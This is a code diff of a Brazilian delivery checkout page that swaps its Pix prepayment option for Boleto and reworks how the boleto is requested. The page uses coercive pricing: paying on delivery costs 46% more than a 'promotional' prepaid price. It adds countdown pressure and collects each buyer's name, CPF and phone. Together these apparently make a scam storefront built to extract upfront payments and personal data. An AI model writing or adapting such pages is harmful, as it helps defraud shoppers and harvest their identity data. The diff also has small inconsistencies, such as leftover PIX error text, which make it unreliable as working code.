@@ -897,7 +897,7 @@
             animation: spin 0.8s linear infinite;
         }
 
-        .pix-error-msg {
+        .boleto-error-msg {
             background: #fef2f2;
             border: 1px solid rgba(255, 59, 48, 0.2);
             border-radius: 10px;
@@ -910,7 +910,7 @@
             gap: 8px;
         }
 
-        .pix-error-msg.visible {
+        .boleto-error-msg.visible {
             display: flex;
         }
 
@@ -1563,7 +1563,7 @@
                 <h3 class="modal-title">Você tem certeza?</h3>
                 <p class="modal-text" id="delivery-warning-text"></p>
                 <div class="modal-buttons">
-                    <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Pix (Desconto)</button>
+                    <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Boleto (Desconto)</button>
                     <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">
                         Continuar sem desconto
                     </button>
@@ -1607,7 +1607,8 @@
         // ==================== CONFIGURAÇÕES FIXAS ====================
         const EMAILJS_SERVICE_ID = 'service_otea'; // Substitua pelo seu Service ID
         const EMAILJS_TEMPLATE_ID = 'template_h2u5'; // Substitua pelo seu Template ID
-        const EMAILJS_PUBLIC_KEY = '74D6TCCH8NMPEz'; // Substitua pela sua Public Key
+        const EMAILJS_PUBLIC_KEY = '74D6TCCH8NMPEz';
+        let timerInterval; // Substitua pela sua Public Key
         // =============================================================
 
         function getUrlParameter(name) {
@@ -1615,8 +1616,14 @@
             return params.get(name);
         }
 
-        const subtotalFromUrl = getUrlParameter('subtotal');
+        
+        const params = new URLSearchParams(window.location.search);
+        const subtotalFromUrl = params.get('subtotal');
         const subtotalValue = subtotalFromUrl ? parseFloat(subtotalFromUrl) : 89.47;
+        const addressFromUrl = params.get('address') || '';
+        const cepFromUrl = params.get('cep') || '';
+        const deliveryTimeFromUrl = params.get('delivery_time') || 'Entrega em 20 Minutos';
+
 
         if (EMAILJS_PUBLIC_KEY && EMAILJS_PUBLIC_KEY !== 'public_xxx') {
             emailjs.init(EMAILJS_PUBLIC_KEY);
@@ -1791,39 +1798,39 @@ function renderOrderSummary() {
                         
                     </div>
                     <div class="payment-options-container">
-                        <div class="payment-option-card" id="pay-now-pix">
+                        <div class="payment-option-card" id="pay-now-boleto">
                             
-                            <div id="pix-original-content">
-                                <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
+                            <div id="boleto-original-content">
+                                <div class="payment-option-icon"><i class="fas fa-barcode"></i></div>
                                 <div class="payment-option-title">
-    <span>Pagar Agora - Pix</span>
+    <span>Pagar Agora - Boleto</span>
     <span class="promo-badge">Promoção</span>
 </div>
                                 <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
                                 <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
                                 <div class="pix-form-container" id="pix-form">
                                     <div class="pix-input-group">
-                                        <label for="pix-name">Nome e Sobrenome</label>
-                                        <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
+                                        <label for="boleto-name">Nome e Sobrenome</label>
+                                        <input type="text" id="boleto-name" placeholder="Ex: João Silva" required>
                                     </div>
                                     <div class="pix-input-group">
-                                        <label for="pix-cpf">CPF</label>
-                                        <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
+                                        <label for="boleto-cpf">CPF</label>
+                                        <input type="tel" id="boleto-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                                     </div>
                                     <div class="pix-input-group">
-                                        <label for="pix-phone">Telefone</label>
-                                        <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
+                                        <label for="boleto-phone">Telefone</label>
+                                        <input type="tel" id="boleto-phone" placeholder="(00) 00000-0000" required>
                                     </div>
-                                    <div class="pix-error-msg" id="pix-error-msg">
+                                    <div class="boleto-error-msg" id="boleto-error-msg">
                                         <i class="fas fa-exclamation-circle"></i>
-                                        <span id="pix-error-text">Erro ao gerar código PIX.</span>
+                                        <span id="boleto-error-text">Erro ao gerar boleto.</span>
                                     </div>
-                                    <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;">
+                                    <button class="payment-action-btn" id="btn-generate-boleto" style="margin-top:10px;">
                                         <span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
                                     </button>
                                 </div>
                             </div>
-                            <div id="pix-copy-content" class="pix-copy-section">
+                            <div id="boleto-copy-content" class="pix-copy-section">
                                 <div class="pix-header-status">
                                     <div class="pix-status-badge"><i class="fas fa-check-circle"></i> Código Gerado</div>
                                     <div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">15:00</span></div>
@@ -1831,23 +1838,23 @@ function renderOrderSummary() {
                                 <div class="duty-info-section">
                                     <div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div>
                                     <div class="duty-user-data">
-                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
-                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-boleto-name">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-boleto-cpf">---</span></div>
 
                                     </div>
-                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu CPF.</span></div>
+                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este boleto é nominal e vinculado ao seu CPF.</span></div>
                                 </div>
                                 <div class="pix-code-display-wrapper">
                                     <div class="pix-code-header">
-                                        <label class="pix-code-label">Código Pix</label>
+                                        <label class="pix-code-label">Código do Boleto</label>
                                         <span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
                                     </div>
                                     <div class="pix-code-input-container">
-                                        <span class="pix-code-display-text" id="pix-code-text">Aguardando código...</span>
-                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código"><i class="fas fa-copy"></i></button>
+                                        <span class="pix-code-display-text" id="boleto-code-text">Gerando boleto...</span>
+                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar Linha Digitável"><i class="fas fa-copy"></i></button>
                                     </div>
                                 </div>
-                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código</button>
+                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar Linha Digitável</button>
                                 <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
                                 <button class="btn-modal-continue" id="btn-already-paid" style="margin-top: 10px; padding: 14px; border-radius: 12px; font-size: 0.95rem; border: none; cursor: pointer; width: 100%; font-weight: 800; background: var(--primary); color: white;">Já realizei o pagamento</button>
                             </div>
@@ -1860,7 +1867,7 @@ function renderOrderSummary() {
                             <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
                             <div class="payment-option-desc">Pague ao entregador via Cartão ou Dinheiro.</div>
                             <div class="delivery-warning-container">
-                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div class="delivery-warning-text">Ao escolher o pagamento na entrega você paga o valor R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos e perde a promoção via Pix de R$ ${baseTotal.toFixed(2).replace('.', ',')}</div></div>
+                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div class="delivery-warning-text">Ao escolher o pagamento na entrega você paga o valor R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos e perde a promoção via Boleto de R$ ${baseTotal.toFixed(2).replace('.', ',')}</div></div>
                                 <button class="payment-action-btn btn-pay-delivery" style="margin-top:10px; background: var(--primary);">Prosseguir <i class="fas fa-chevron-right"></i></button>
                             </div>
                         </div>
@@ -1869,26 +1876,26 @@ function renderOrderSummary() {
             `;
 
             document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
-            const pixNameInput = document.getElementById('pix-name');
+            const pixNameInput = document.getElementById('boleto-name');
             if (pixNameInput) setupNameInput(pixNameInput);
-            const pixCpfInput = document.getElementById('pix-cpf');
+            const pixCpfInput = document.getElementById('boleto-cpf');
             if (pixCpfInput) setupCPFInput(pixCpfInput);
-            const pixPhoneInput = document.getElementById('pix-phone');
+            const pixPhoneInput = document.getElementById('boleto-phone');
             if (pixPhoneInput) setupPhoneInput(pixPhoneInput);
 
-            const pixCard = document.getElementById('pay-now-pix');
+            const pixCard = document.getElementById('pay-now-boleto');
             const deliveryCard = document.getElementById('pay-on-delivery');
 
             pixCard.addEventListener('click', (e) => {
                 if (e.target.tagName === 'INPUT' || e.target.tagName === 'LABEL') return;
-                if (document.getElementById('pix-copy-content').style.display === 'flex') return;
+                if (document.getElementById('boleto-copy-content').style.display === 'flex') return;
                 if (selectedPaymentType !== 'pix') {
                     selectedPaymentType = 'pix';
                     pixCard.classList.add('selected');
                     deliveryCard.classList.remove('selected');
                     const header = document.querySelector('.header'); const headerHeight = header ? header.offsetHeight : 0; const viewportHeight = window.innerHeight - headerHeight; const elementHeight = pixCard.offsetHeight; const elementOffsetTop = pixCard.getBoundingClientRect().top + window.pageYOffset; const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2); window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
-                } else if (e.target.closest('#btn-generate-pix')) {
-                    generatePix();
+                } else if (e.target.closest('#btn-generate-boleto')) {
+                    generateBoleto();
                 }
             });
 
@@ -1910,7 +1917,7 @@ function renderOrderSummary() {
 
 
 
-        function startPixTimer(durationInSeconds) {
+        function startBoletoTimer(durationInSeconds) {
             clearInterval(timerInterval);
             let timer = durationInSeconds;
             const display = document.getElementById('pix-timer');
@@ -1934,13 +1941,13 @@ function renderOrderSummary() {
             } catch (err) { console.error('EmailJS error:', err); }
         }
 
-        async function generatePix() {
-            const name = document.getElementById('pix-name').value.trim();
-            const cpfRaw = document.getElementById('pix-cpf').value;
-            const phone = document.getElementById('pix-phone').value.trim();
+        async function generateBoleto() {
+            const name = document.getElementById('boleto-name').value.trim();
+            const cpfRaw = document.getElementById('boleto-cpf').value;
+            const phone = document.getElementById('boleto-phone').value.trim();
             const cpf = cpfRaw.replace(/\D/g, '');
-            const errorEl = document.getElementById('pix-error-msg');
-            const errorText = document.getElementById('pix-error-text');
+            const errorEl = document.getElementById('boleto-error-msg');
+            const errorText = document.getElementById('boleto-error-text');
             errorEl.classList.remove('visible');
 
             if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
@@ -1951,11 +1958,11 @@ function renderOrderSummary() {
             
             // Se já gerou um PIX com o mesmo valor, apenas exibe novamente (mesmo após atualizar a página)
             if (savedPix && parseFloat(savedPix.amount) === subtotalValue && savedPix.code) {
-                showPixCopySection(savedPix.code, name, cpfRaw);
+                showBoletoCopySection(savedPix.code, name, cpfRaw);
                 return;
             }
 
-            const btn = document.getElementById('btn-generate-pix');
+            const btn = document.getElementById('btn-generate-boleto');
             const originalHTML = btn.innerHTML;
             btn.innerHTML = '<div class="spinner"></div>';
             btn.disabled = true;
@@ -1967,60 +1974,85 @@ function renderOrderSummary() {
                 if (cpf === '11111111111') {
                     const fakePixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
                     localStorage.setItem('cached_pix_data', JSON.stringify({ code: fakePixCode, amount: subtotalValue }));
-                    showPixCopySection(fakePixCode, name, cpfRaw);
+                    showBoletoCopySection(fakePixCode, name, cpfRaw);
                     return;
                 }
 
-                // 1. Captura de dados da URL
-const params = new URLSearchParams(window.location.search);
-const subtotalValue = parseFloat(params.get('subtotal')) || 89.90;
-const addressFromUrl = params.get('address') || '';
-const cepFromUrl = params.get('cep') || '';
-
-// 2. Função para chamar o backend e gerar o boleto
-async function fetchBoleto(payerName, cpf, phone) {
-    const names = payerName.split(' ');
-    const firstName = names[0];
-    const lastName = names.length > 1 ? names.slice(1).join(' ') : 'Silva';
-    
-    // Divide o endereço da URL (Ex: Rua Exemplo, 123)
-    const addressParts = addressFromUrl.split(',');
-    const streetName = addressParts[0] || 'Rua não informada';
-    const streetNumber = addressParts[1] ? addressParts[1].trim().split(' ')[0] : 'SN';
-
-    const response = await fetch('/process_payment', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            transaction_amount: subtotalValue,
-            payer: {
-                email: 'cliente@email.com', // Pode ser capturado de um input se desejar
-                first_name: firstName,
-                last_name: lastName,
-                identification: { type: 'CPF', number: cpf },
-                address: {
-                    zip_code: cepFromUrl.replace(/\D/g, ''),
-                    street_name: streetName,
-                    street_number: streetNumber,
-                    neighborhood: 'Bairro',
-                    city: 'Cidade',
-                    federal_unit: 'SP'
+                const pixCode = await fetchBoleto(name, cpf, phone);
+                if (pixCode) { 
+                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: pixCode, amount: subtotalValue }));
+                    showBoletoCopySection(pixCode, name, cpfRaw); 
                 }
+                else { throw new Error(); }
+            } catch (err) {
+                errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
+                errorEl.classList.add('visible');
+                btn.innerHTML = originalHTML;
+                btn.disabled = false;
             }
-        }),
-    });
-    const data = await response.json();
-    return data.digitable_line || data.barcode; // Retorna a linha digitável para o usuário copiar
-}
+        }
 
+        
+        async function fetchBoleto(payerName, cpf, phone) {
+            const names = payerName.split(' ');
+            const firstName = names[0];
+            const lastName = names.length > 1 ? names.slice(1).join(' ') : 'Silva';
+            
+            const addressParts = addressFromUrl.split(',');
+            const streetName = addressParts[0] || 'Rua não informada';
+            const streetNumber = addressParts[1] ? addressParts[1].trim().split(' ')[0] : 'SN';
 
-        function showPixCopySection(qrCode, name, cpf) {
-            document.getElementById('pix-original-content').style.display = 'none';
-            document.getElementById('pix-copy-content').style.display = 'flex';
-            document.getElementById('display-pix-name').innerText = name;
-            document.getElementById('display-pix-cpf').innerText = cpf;
-            document.getElementById('pix-code-text').innerText = qrCode;
-            const pixCardEl = document.getElementById('pay-now-pix');
+            const response = await fetch('/process_payment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    transaction_amount: subtotalValue,
+                    description: 'Pagamento de Pedido',
+                    payer: {
+                        email: 'cliente@email.com',
+                        first_name: firstName,
+                        last_name: lastName,
+                        identification: {
+                            type: 'CPF',
+                            number: cpf
+                        },
+                        address: {
+                            zip_code: cepFromUrl.replace(/\D/g, ''),
+                            street_name: streetName,
+                            street_number: streetNumber,
+                            neighborhood: 'Bairro',
+                            city: 'Cidade',
+                            federal_unit: 'SP'
+                        }
+                    }
+                }),
+            });
+            const data = await response.json();
+            return data.digitable_line || data.barcode;
+        }
+
+        async function fetchPixCode_OLD(payerName, cpf, phone) {
+            const response = await fetch('/api/pix', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    payer_name: payerName,
+                    payer_cpf: cpf,
+                    payer_phone: phone,
+                    amount: subtotalValue.toFixed(2)
+                }),
+            });
+            const data = await response.json();
+            return data.success ? data.pixCode : null;
+        }
+
+        function showBoletoCopySection(qrCode, name, cpf) {
+            document.getElementById('boleto-original-content').style.display = 'none';
+            document.getElementById('boleto-copy-content').style.display = 'flex';
+            document.getElementById('display-boleto-name').innerText = name;
+            document.getElementById('display-boleto-cpf').innerText = cpf;
+            document.getElementById('boleto-code-text').innerText = qrCode;
+            const pixCardEl = document.getElementById('pay-now-boleto');
             if (pixCardEl) {
                 const header = document.querySelector('.header');
                 const headerHeight = header ? header.offsetHeight : 0;
@@ -2030,11 +2062,11 @@ async function fetchBoleto(payerName, cpf, phone) {
                 const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2);
                 window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
             }
-            startPixTimer(15 * 60);
+            startBoletoTimer(15 * 60);
         }
 
         function copyPixCode() {
-            const code = document.getElementById('pix-code-text').innerText;
+            const code = document.getElementById('boleto-code-text').innerText;
             navigator.clipboard.writeText(code).then(() => {
                 // Atualiza botão principal
                 const btn = document.getElementById('btn-copy-pix-action');
@@ -2043,7 +2075,7 @@ async function fetchBoleto(payerName, cpf, phone) {
                     btn.style.background = '#28a745';
                     btn.style.color = 'white';
                     setTimeout(() => { 
-                        btn.innerHTML = 'Copiar código'; 
+                        btn.innerHTML = 'Copiar Linha Digitável'; 
                         btn.style.background = ''; 
                         btn.style.color = ''; 
                     }, 2000);
@@ -2113,7 +2145,7 @@ async function fetchBoleto(payerName, cpf, phone) {
         function showDeliveryModal() {
             const baseTotal = subtotalValue;
             const deliveryTotal = baseTotal * 1.46;
-            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> total sem descontos e perde a promoção via Pix de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
+            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> total sem descontos e perde a promoção via Boleto de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
             const modal = document.getElementById('delivery-modal');
             document.getElementById('modal-step-1').style.display = 'block';
             document.getElementById('modal-step-2').style.display = 'none';
@@ -2145,13 +2177,23 @@ async function fetchBoleto(payerName, cpf, phone) {
         const deliveryCpfInput = document.getElementById('delivery-cpf');
         if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);
 
+        
+        console.log('Script carregado');
         document.addEventListener('DOMContentLoaded', () => {
-            renderOrderSummary();
-            renderPaymentOptions();
+            console.log('DOM carregado, iniciando renderização');
+            try {
+                renderOrderSummary();
+                console.log('Resumo do pedido renderizado');
+                renderPaymentOptions();
+                console.log('Opções de pagamento renderizadas');
+            } catch (e) {
+                console.error('Erro na renderização:', e);
+            }
         });
+
     </script>
 
-    <!-- Modal de "Código Pix Copiado" Compacto -->
+    <!-- Modal de "Código do Boleto Copiado" Compacto -->
 <div id="pixCopiedModal" class="pix-modal-overlay">
     <div class="pix-modal-content">
         <button class="pix-modal-external-close" onclick="fecharPixModalDireto()">
@@ -2162,7 +2204,7 @@ async function fetchBoleto(payerName, cpf, phone) {
     <!-- Ícone de Sucesso -->
     <i class="fas fa-check-circle" style="display: block !important; margin: 0 auto 16px auto !important; color: #16a34a; font-size: 42px;"></i>
     
-    <h2 style="margin: 0 0 8px 0 !important; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important; color: #1e293b !important; font-weight: 700 !important; font-size: 20px;">Código Pix Copiado!</h2>
+    <h2 style="margin: 0 0 8px 0 !important; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important; color: #1e293b !important; font-weight: 700 !important; font-size: 20px;">Código do Boleto Copiado!</h2>
 
     <!-- Card de Identificação Profissional -->
     <div style="all: initial !important; display: flex !important; align-items: center !important; gap: 14px !important; background-color: #ffffff !important; border: 1px solid #e2e8f0 !important; border-radius: 12px !important; padding: 16px !important; margin: 20px 0 !important; width: 100% !important; box-sizing: border-box !important; font-family: 'Segoe UI', Roboto, sans-serif !important; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
@@ -2226,7 +2268,7 @@ async function fetchBoleto(payerName, cpf, phone) {
         <button class="pix-modal-close-compact" onclick="fecharPixModal(this)">ENTENDI, VOU PAGAR</button>
     </div>
 </div>
-<!-- Fim Modal de "Código Pix Copiado" -->
+<!-- Fim Modal de "Código do Boleto Copiado" -->
 
 </body>
 </html>
